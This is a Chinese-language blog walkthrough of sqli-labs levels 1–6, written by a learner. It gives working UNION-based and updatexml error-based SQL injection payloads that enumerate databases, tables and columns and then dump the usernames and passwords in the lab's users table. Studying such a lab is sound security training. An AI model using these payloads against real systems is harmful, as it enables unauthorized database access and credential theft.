# sqli-lab解题过程

### less-1

* 根据提示输入?id=1
  ![](https://blog.chrizsty.cn/wp-content/uploads/2024/11/屏幕截图-2024-11-24-173515.png)

  发现有回显，下一步就可以尝试联合注入。

* 构造闭合?id=1\，得到报错信息
  ```mysql
  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1\' LIMIT 0,1' at line 1
  //我看网上都很少有人详细分析报错信息，导致我在这里卡了半天
  //''1\' LIMIT 0,1'这样的信息要先去掉''这个报错固定句式，剩下'1\' LIMIT 0,1
  //自己己输入的是1\，那么就可以确定这个sql语句后面为‘$_id’ LIMIT 0,1
  ```

  所以构造闭合?id=1‘ --+

* 判断列数
  ```mysql
  ?id=1' order by 1 --+
  ?id=1' order by 2 --+
  ?id=1' order by 3 --+
  ?id=1' order by 4 --+ //开始报错，可以判断列数为3
  ```

* 构造联合语句，并且判断回显是哪几列
  ```mysql
  ?id=null' union select 1,2,3 --+ 
  //这里需要union前面的语句不返回数据才行，所以我用的是null
  ```

  ![](https://blog.chrizsty.cn/wp-content/uploads/2024/11/屏幕截图-2024-11-24-180657.png)
  可知第2，3列会回显数据

* 爆库名

  * 当前库
    ```mysql
    ?id=null' union select 1,database(),3 --+
    ```

    ![](https://blog.chrizsty.cn/wp-content/uploads/2024/11/屏幕截图-2024-11-24-181152.png)

    可知当前库是security

  * 所有库

    ```mysql
    ?id=null' union select 1,group_concat(schema_name),3 from information_schema.schemata --+
    ```

    ![](https://blog.chrizsty.cn/wp-content/uploads/2024/11/屏幕截图-2024-11-24-181745.png)

    可知知道所有库information_schema,challenges,mysql,performance_schema,security，下述以security为例做wp

* 爆表名

  ```mysql
  ?id=null' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema="security" --+
  //这里where就是用来指定库名
  ```

  ![](https://blog.chrizsty.cn/wp-content/uploads/2024/11/屏幕截图-2024-11-24-182126.png)

  得到security库下所有表emails,referers,uagents,users，以users表做例子来写wp

* 爆列名
  ```mysql
  ?id=null' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema="security" and table_name="users" --+
  //这里where同时确定库名也确定表名，防止串库查询
  ```

  ![](https://blog.chrizsty.cn/wp-content/uploads/2024/11/屏幕截图-2024-11-24-182536.png)

  得到该表下的所有列名id,username,password

* 查询数据

  ```mysql
  ?id=null' union select 1,group_concat(username),group_concat(password) from users  --+
  ```

  ![](https://blog.chrizsty.cn/wp-content/uploads/2024/11/屏幕截图-2024-11-24-182818.png)

### less-2

没有闭合方式，做法与上类似

### less-3

闭合方式为`('$_id')`，做法与上类似

### less-4

闭合方式为`("$_id")`，做法与上类似

### less-5

* 按提示输入`?id=1`
  ![](https://blog.chrizsty.cn/wp-content/uploads/2024/11/屏幕截图-2024-11-24-224014.png)

  发现没有回显，同时尝试构造闭合`?id=1\`
  ![](https://blog.chrizsty.cn/wp-content/uploads/2024/11/屏幕截图-2024-11-24-224138.png)

  发现有报错信息且是''闭合，开始尝试报错注入

* 判断注入点

  ```mysql
  ?id=1' and 1=1 --+
  ?id=1' and 1=2 --+ //不显示页面
  ```

* 报错注入爆库名
  ```mysql
  ?id=1' and updatexml(1,concat(0x7e,database(),0x7e),3) --+
  //updatexml()有一个致命缺陷，如果在要更新的节点路径里面出现了特殊符号就会报错，而第该参数里的信息都会暴露在报错里，这也是报错注入的主力
  //concat()函数，将字符串连接起来
  ```

  ![](C:\Users\Chrizsty\AppData\Roaming\Typora\typora-user-images\image-20241124225815911.png)

  知道库名是security

* 爆表名（与上类似）

  ```mysql
  ?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema="security" limit 3,1),0x7e),3) --+
  //这里如果没有limit限制输出数量，会导致出现“Subquery returns more than 1 row”
  ```

  ![](https://blog.chrizsty.cn/wp-content/uploads/2024/11/屏幕截图-2024-11-24-230446.png)

  确定表名users

* 爆列名
  ```mysql
  ?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema="security" and table_name="users" ),0x7e),3) --+
  ```

  ![](https://blog.chrizsty.cn/wp-content/uploads/2024/11/屏幕截图-2024-11-24-230842.png)

  拿到列名

* 爆数据
  ```mysql
  ?id=1' and updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),3) --+
  ```

  ![](https://blog.chrizsty.cn/wp-content/uploads/2024/11/屏幕截图-2024-11-24-231817.png)

### less-6

（布尔盲注，因为报错信息不显示）

### 后面还没学会

